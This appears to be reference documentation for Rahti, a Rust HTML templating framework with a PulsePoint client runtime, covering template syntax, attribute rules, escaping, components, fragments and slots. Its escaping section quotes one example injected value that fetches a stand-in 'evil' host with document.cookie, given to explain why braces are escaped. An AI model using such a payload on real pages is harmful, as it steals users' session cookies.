# Rendering and Components

## Templates

Format authored markup with `cargo rahti fmt` after `cargo fmt`, and verify
with `cargo rahti fmt --check`. Use four-space nesting, separate lines for
nested elements, and wrapped long attribute lists. Keep client `{…}` and
server `@{…}` contents intact; a long expression may exceed the line width.
Keep visible spaces inside quoted text. See "Formatting authored markup" in
`configuration-and-tooling.md` for the scope and preservation rules.

A template is markup written as Rust tokens: `html! { … }`. Only a `<script>`
or `<style>` body is a string — one raw string literal.

```rust
html! {
    <section class="card">
        <h1>@{server_title}</h1>
        <p>"Don't worry — text is a quoted string."</p>
        <button onclick={setCount(count + 1)} hidden={done}>"Clicked "{count}" times"</button>
        <script>r##"
            // Plain JavaScript: 'single quotes', `templates` and "#fff" all work.
            const [count, setCount] = pp.state(@{initial_count});
            const done = false;
        "##</script>
    </section>
}
```

The markup is tokens, so Rust tooling reads it: rust-analyzer completes,
renames and jumps to definition inside `@{…}`, a Rust error is reported on the
exact token, and `html!` works inside `macro_rules!` like any other macro.
JavaScript and CSS go in a raw string, where nothing is lexed as Rust. Two
dialects stand out from the HTML:

| Syntax | Owner | Evaluation time |
| --- | --- | --- |
| `@{rust_expression}` | Rust/Rahti | server render |
| `{javascript_expression}` | PulsePoint | browser render |

- **Text** is a quoted string, `<p>"Hello"</p>`, written to the page as it is
  — apostrophes, `#` and any punctuation included. Several pieces sit side by
  side: `"Clicked "{count}" times"`. Whitespace between tokens is never text,
  so a space that belongs on the page goes inside the quotes. Write a literal
  `<` as `&lt;` and a literal brace as `&#123;`/`&#125;`.
- **Attributes** are written as in HTML. A literal value is a quoted string,
  `class="card"`; a PulsePoint binding is a braced expression, `hidden={!open}`;
  a server value is `@{…}`, `href=@{url}`. A handler is a binding,
  `onclick={save()}` — a quoted handler is a compile error naming that form.
- **A binding is JavaScript the Rust lexer reads as tokens**, then copies
  through exactly as written. Use double-quoted strings inside one, `"a"`; a
  multi-character `'…'` string or a template literal does not lex, so logic
  that needs them belongs in the script as a named function.
- **`<script>` and `<style>`** bodies are always written `r##"…"##` and reach
  the browser exactly as written — quotes, `"#fff"`, `querySelector("#id")`,
  template literals and comments included. Two `#`s is the one spelling:
  `html!` refuses `r"…"` and `r#"…"#` with that form. Only a body that itself
  contains `"##` takes a third, `r###"…"###`. `@{expr}` inside a script
  renders a Rust value as JavaScript (see "Escaping and Trusted Markup"); write
  `@@{` for a literal `@{`. A body written as tokens is a compile error.
- **Comments** are Rust comments, `// …`, and are not sent to the browser.
- **A template nested in `@{…}`** is another `html!`:
  `@{Html::concat(items.iter().map(|i| html! { <li>@{i}</li> }))}`. Prefer a
  component, or build the list in Rust above the template.

Compute values in plain Rust above the template and interpolate names
(`@{title}`, not `@{user.profile().display_name()}`): the template stays
readable, and every error — `html!`'s own or rustc's — is reported on the
token that caused it.

The two dialects also print differently. `@{…}` renders a Rust value through
`Display`, so `false` renders `false`. `{…}` serializes its result the way
React serializes a JSX child, so a `bool` or an `Option::None` seeded into the
browser renders as *nothing at all* — a correct value with no visible output.
The complete table, including the attribute rules, is under "Value Rendering"
in `pulsepoint.md`; read it before binding a value that is not a string or a
number.

## Roots, Raw-Text Elements, and Attributes

An `html!` block produces one rooted markup value. A document doctype may
precede the document root. Void elements are self-closing in authored markup.

Attribute forms:

```rust
<a href=@{url}>@{label}</a>
<input value={name} oninput={setName(target.value)} />
```

A PulsePoint binding is a braced expression; a server value is `@{…}`.
Rahti quotes dynamic attributes in emitted HTML, and client
expressions remain present for PulsePoint.

An attribute name is written as it appears in markup: letters, digits, `-`,
and `:` for a namespace prefix — `data-user-id`, `aria-label`, `xlink:href`,
`xml:space`.

### Whether an Attribute Is Written

An `@{…}` value decides whether its attribute appears at all.

| Value | Renders |
| --- | --- |
| anything ordinary | `name="value"` |
| `Option::None` | nothing |
| `Option::Some(v)` | whatever `v` renders |
| `true` on a boolean attribute | `name=""` |
| `false` on a boolean attribute | nothing |
| `true` / `false` anywhere else | `name="true"` / `name="false"` |

```rust
<a href=@{maybe_url}>"Profile"</a>       // no href when None
<input disabled=@{is_locked} />          // no disabled when false
<span aria-hidden=@{decorative}>…</span> // aria-hidden="false" when false
```

A *boolean attribute* is one HTML reads by presence, and which one that is
depends on the name — decided at compile time, not by the value's type. The
list is the HTML specification's: `allowfullscreen`, `async`, `autofocus`,
`autoplay`, `checked`, `controls`, `default`, `defer`, `disabled`, `download`,
`formnovalidate`, `hidden`, `inert`, `ismap`, `itemscope`, `loop`, `multiple`,
`muted`, `nomodule`, `novalidate`, `open`, `playsinline`, `readonly`,
`required`, `reversed`, `selected`, and the three `shadowroot*` attributes.

What is *not* on it matters as much. `aria-*` attributes are enumerated:
`aria-hidden="false"` is a different thing from no `aria-hidden` at all, and
dropping it would change what a screen reader announces. So are
`contenteditable`, `draggable`, `spellcheck`, `translate` and `autocomplete`,
which read their values as words. A `bool` written on any of them renders as
the word it is.

Nothing here changes a literal: `<input required>` and `hidden="until-found"`
are written exactly as typed.

### Spreading Attributes

`@{..expr}` writes a set of attributes computed in Rust:

```rust
let extra = Attrs::new().set("id", "avatar").unset("stroke-width");

html! {
    <svg class="size-4" stroke-width="2" @{..extra}>"…"</svg>
}
```

```html
<svg class="size-4" id="avatar">…</svg>
```

Two dots, and inside `@{…}` — the server dialect. `{...attrs}` is JSX's
spelling and does not work here: `{…}` in a tag belongs to PulsePoint, and the
two dialects never trade places.

An attribute written later replaces one written earlier, in place, so where
the spread sits is what it means: after the attributes it overrides them,
before them it supplies defaults. `Attrs::unset` removes an attribute
outright, which no value can express.

`@{..expr}` takes anything implementing `Attributes`: `Attrs`, pairs in an
array, slice, `Vec` or map, and an `Option` of any of them — so a spread that
is sometimes nothing is `@{..maybe}` rather than a branch around the tag. A
`HashMap` spreads in sorted order, because markup that changes between two
runs of the same code cannot be reviewed.

Names are validated and values escaped, the same as everywhere else, braces
included: a spread value is data and never opens a client expression. A name
markup cannot carry is dropped and reported through `debug_assert!` —
development says so, and a release build serves the page without that one
attribute. `pp-component` is the client runtime's and a spread never writes
it.

A spread is for elements. A component takes typed props, so a component that
forwards attributes declares one — `attrs: Attrs` — and the caller passes it
by name; an unknown prop stays a compile error rather than becoming an HTML
attribute nobody meant to write.

### Client Props: `bindings: Bindings`

A `{…}` written on a component tag is a client expression, so the component
function receives its source rather than a value. All of a tag's `{…}` props
arrive in one parameter, `bindings: Bindings`; spreading it puts them on the
element the component renders, where the runtime evaluates them in the
caller's scope:

```rust
use crate::rahti::{Bindings, Html, component, html};

#[component]
pub fn Button(bindings: Bindings, children: Html) -> Html {
    html! { <button class="btn" @{..bindings}><slot /></button> }
}

// <Button onclick={save()} title={label}>"Save"</Button>
// renders <button class="btn" onclick={save()} title={label}>Save</button>
```

Each binding lands in the form an element writes it: a native handler
(`onclick`) as JavaScript, and everything else — a value, `on-select`, a
`pp-ref` — as an expression in braces. Only `html!` builds a `Bindings`,
from the source written at the tag, so its expressions stay live. A tag that
writes a `{…}` prop on a component without a `bindings` parameter is a
compile error naming the field.

Every other spread value is data, braces escaped. A component that composes
client code in Rust — a handler from a builder, a caller's binding under a new
name — writes it with `Attrs::bind`, the explicit form for code the author
wrote, never for a value from a request:

```rust
let attrs = Attrs::new()
    .bind("onclick", "toggle()")                   // onclick={toggle()}
    .bind("checked", "pp.props.checkedProp")       // live
    .set("title", "{not code}");                   // data: braces escaped
let merged = own.merge(&caller);                  // last-wins, bindings kept
let aria = caller.only(|name| name.starts_with("aria-"));
```

`merge` folds one set into another and `only` takes a subset; both keep a
binding a binding. Rebuilding a set from `iter()` and `set` turns every
binding into text.

`<script>` and `<style>` bodies are raw text. Browser JavaScript/CSS braces
remain literal. `@{...}` is supported inside `<script>` and renders through
`RenderJs`; it is not lifted inside `<style>`.

### Scripts

A `<script>` body is JavaScript exactly as written — comments, single
quotes, template literals and regex literals included:

```rust
html! {
    <section>
        <p>{greeting}</p>
        <script>r##"
            // Comments stay.
            const name = @{Json(&user.name)};
            const [greeting, setGreeting] = pp.state(`Hello, ${name}!`);
            const color = "#4f46e5";
        "##</script>
    </section>
}
```

`@{expr}` is lifted from it as a Rust expression, rendered through
`RenderJs`; write `@@{` for a literal `@{`. Keep large modules in
`public/js/` and load them with `import()`.

## Escaping and Trusted Markup

Rust strings and values are escaped in text and attribute position. Attributes
also escape quotes. Braces are escaped too, as `&#123;` and `&#125;`: the
browser runtime compiles every `{…}` it finds in a reactive block, so a stored
value such as `{fetch('//evil/' + document.cookie)}` would otherwise run as
code. The page shows the braces as text. `Html` is already trusted and passes
through with its braces live.

- `Html::escape(text)` creates safe text markup.
- `Html::from_raw(raw)` trusts the caller completely; use only with sanitized
  or framework-authored markup.
- `Html::empty()` represents no output.
- `Html::concat(iter)` joins several `Html` fragments in order.
- `Option<T: Render>` renders its value or nothing.

Inside `<script>`, primitives render as JavaScript literals, strings are JSON
quoted, `Option::None` is `null`, and `Json(&serializable_value)` embeds
objects/arrays. Rahti neutralizes `<` in serialized script values to prevent a
value from closing the surrounding script.

To show literal PulsePoint braces as text, use a brace character reference
such as `"&#123;user&#125;"`; the macro protects it so the browser runtime
does not treat it as a binding.

The root layout's `<slot />` sits inside a deferred `<template
pp-component>`, and the browser decodes one layer of character references as
it parses that template. `html!` therefore writes a root layout's children one
encoding layer higher (`&amp;#123;`), skipping `<script>` and `<style>`
bodies, so a value's `&#123;` still reaches the runtime as a reference.
Markup outside the slot, such as `<head>`, is parsed once and shows `&#123;`
as a brace directly.

## Components

A component is an ordinary PascalCase Rust function:

```rust
use crate::rahti::{Html, component, html};

#[component]
pub fn Card(title: &str, children: Html) -> Html {
    html! {
        <section>
            <h2>@{title}</h2>
            <slot />
        </section>
    }
}
```

Call it as a tag. A tag name starting with a capital letter is a component —
no HTML tag starts uppercase — and its attributes name the function's
parameters:

```rust
<Card title="Profile">
    <p>"Ada"</p>
</Card>
```

A prop value is a Rust expression: a literal as written (`title="Profile"`,
`count=3`), or `@{expr}` for anything computed. A bare prop is the boolean
shorthand — `<Card wide>` passes `wide: true`. A client `{…}` binding is not
a prop value and fails to compile: a component runs at render, and there is
nothing of the browser in it.

The tag form is compile-time sugar over the function call. `Card` is still an
ordinary function, and the call form is what expression contexts use — a
loop, a condition, a `map`:

```rust
@{Html::concat(users.iter().map(|user| Card(user, Html::empty())))}
```

Prop mistakes fail with rustc's ordinary struct-literal errors: a missing
prop is "missing field", an unknown one is "no field named", a doubled one is
"specified more than once". Behind the tag, `#[component]` generates a hidden
props struct sharing the function's name; the one `use` that imports the
component imports both, and an aliased import
(`use lib::Button as Installed;` → `<Installed … />`) carries the pair along.

Rules:

- use `#[component]` with no arguments;
- name the function in PascalCase — the capital is what makes a tag resolve
  to it;
- return `Html`;
- end branches/returns in the `html!` value being returned;
- take props as normal typed Rust arguments;
- keep one root — a literal element, or a single component tag (see
  Composition below);
- write client `{…}` bindings inside the root, not on it: root attributes
  are evaluated in the caller's scope, so `html!` refuses a component's own
  `{…}` on its root (handlers excepted — see "Events" in `pulsepoint.md`);
- do not manually stamp `pp-component` unless implementing a deliberate
  framework boundary.

The attribute stamps a stable component identifier derived from function name
and source location. That boundary gives each rendered instance its own
PulsePoint state.

A convention file under `app/` is named the same way, from its path. The one
block shaped differently is a document — a root layout, whose single parent
element is `<html>`. Stamping that element would make the whole document a
component, so `html!` injects `<template pp-component="...">` around the
`<slot />` instead. See `routing.md`.

## Composition

A block — a page, or another component — may render a component tag as its
whole output:

```rust
#[component]
pub fn Spotlight(children: Html) -> Html {
    html! {
        <Card title="Spotlight">@{children}</Card>
    }
}
```

A block rooted in a component tag owns no element of its own, so it takes no
`pp-component` marker and adds no reactive scope: it dissolves into the
component it renders, exactly as a React wrapper that returns another
component contributes no DOM. The browser runtime reads one identity per
element, and that element is the inner component's. Consequences:

- a wrapper that only forwards props and children needs no element around
  the inner tag;
- a component that carries its own `<script>` keeps an element root — or a
  fragment root, which is one — since a dissolved wrapper has no block for
  the script to live in;
- a page rooted in a component tag ships no page marker; the children the
  page writes between the tags are still the page's own fragments, named by
  the file as always;
- a root layout keeps its literal `<html>` root — a document's doctype and
  document element are written in the layout, with components inside them.

## Fragments

A block that renders siblings may root itself in `<>…</>`:

```rust
#[component]
pub fn Pair(label: &str) -> Html {
    html! {
        <>
            <dt>@{label}</dt>
            <dd><slot /></dd>
        </>
    }
}
```

The fragment ships as a comment pair carrying the block's name:

```html
<!--pp:pair_3f2a91c8--><dt>Role</dt><dd>Engineer</dd><!--/pp-->
```

Comments are legal in every content context, so the served markup stays
valid wherever the fragment lands — `<tbody>`, `<ul>`, `<select>` included —
and a page without JavaScript renders the siblings bare, exactly as written.
At hydration the browser runtime turns the pair into a live
layout-invisible boundary: that is where the block's name lands, where its
`<script>` lives, and where its re-renders happen, so a fragment-rooted
component keeps its own state like any other. The boundary's box is removed
from layout — the siblings participate in the parent's flex, grid, or flow
as direct items.

Rules and consequences:

- a fragment is a *root* — of an `html!` block, or of the children between a
  component's tags. Inside an element, siblings need no wrapper and the form
  is refused;
- fragment-rooted children of a component tag are a single named block, so
  bindings and a script inside them share one scope — the multi-root escape
  from the reactive boundary rule's unstamped shapes;
- under a table-model or `<select>` parent, the markers stay as served and
  no boundary is created: the browser's parser polices those content models
  on every re-render round-trip, so the fragment is grouping only there.
  Rows render and morph correctly, but keep scripts and bindings out of a
  fragment in those contexts — they would fall to the enclosing scope;
- after hydration the boundary is an element in the DOM (outside the strict
  contexts above), so a CSS child selector (`.parent > *`) sees it rather
  than the siblings. Prefer class selectors inside fragments;
- a root layout still writes `<html>` literally — a fragment is not a
  document.

## Children and Slots

Children are not implicit in the function: declare `children: Html`, then
place `<slot />`. At the call site they are what sits between the tags —
markup, text, other component tags, `@{…}` values, or several
siblings, joined in order:

```rust
<Card title="Profile">
    <p>"Ada"</p>
    <Badge text="Rust" />
</Card>
```

An empty tag pair — `<Card title="…"></Card>` — passes `Html::empty()`. A
self-closing tag passes no `children` argument at all: it is the form for a
component that declares none, and calling a component that does declare one
self-closing fails with "missing field `children`".

Children built in Rust are handed in with `@{…}`, or passed positionally
through the call form. For repeated children:

```rust
let rows = Html::concat(items.iter().map(|item| html! {
    <li>@{item}</li>
}));
```

```rust
<Card title="Rows">
    <ul>@{rows}</ul>
</Card>
```

A component that takes `children` and passes it on interpolates it between
the next component's tags instead of writing `<slot />`, alone or beside
markup of its own:

```rust
#[component]
pub fn Section(title: &str, children: Html) -> Html {
    html! {
        <section>
            <Panel title=@{title}>
                <h3>{heading}</h3>
                @{children}
            </Panel>
            <script>r##"const heading = "Totals";"##</script>
        </section>
    }
}
```

The children keep the block that wrote them as their owner at every level:
`{heading}` reads `Section`'s scope, and a page's
`<Section title="…"><b>{count}</b></Section>` keeps `{count}` the page's,
updated when the page's state changes. That holds when the receiving
component renders `<slot />` inside its own `pp-for` (the children render
once per row) and when the passing component sits in a page's `pp-for`, with
the children reading the loop variable.

## Reactive Boundary Rule

Each stamped `html!`/component block is a PulsePoint scope — and children
written between component tags read the scope of the block that wrote them,
the way React children close over the component that rendered them. Which
serialization the children take is decided per child block:

- **Children carrying a client `{…}` binding** — in text, as an element
  attribute value, or as a prop on a component tag — and no `<script>` of
  their own ship as `<template pp-owner="…">…</template>` inside the
  component's boundary. The runtime renders the template in the owner's
  scope and re-renders it whenever the owner's state changes, so
  `<Badge>{count}</Badge>` follows the page's `count`, and so does
  `<Card><Input value={query} /></Card>`: the inner component writes the
  prop on its root, which is evaluated in the owner's scope. Owned content
  is inert markup until hydration.
- **Children carrying their own `<script>`** are a self-contained block: a
  single root is stamped `pp-component` — the same block a separate
  `html! { … }` child argument is — and its bindings resolve against state
  it declares itself, never the caller's.
- **Static children** are served inline, visible without JavaScript, with a
  single root stamped as before.

Two shapes stay in the component's scope: children rooted in `<>…</>`
keep the fragment's own-block stamping even when they carry bindings, and
`Html` built in Rust and handed over as `@{expr}` is opaque — the macro cannot
see its bindings, so it renders inside the component's boundary and reads its
scope, not the caller's. Children a component received between its own tags
and hands on with `@{children}` are the exception: they are already wrapped
for their owner, and keep it.

State, functions, and the script that declares them still belong together: a
reusable interactive child should be its own `#[component]` or carry its own
script inside its own root.

## Component Modules

Application component files live under `src/components/`. Nested directories
are supported. File and directory names must be valid, non-keyword Rust module
identifiers: do not start with a digit or use hyphens. Dotfiles and non-Rust
files are ignored. `rahti-build` regenerates module files, making a direct file
available as:

```rust
crate::components::<file>::<Component>
```

One file may export several components. A nested file is reached through its
full generated module path.

Components live in `src/components/`. That is the only directory the build
scans for them, and it is the only directory Tailwind is pointed at besides
the app directory — a component written anywhere else is styled by nothing.
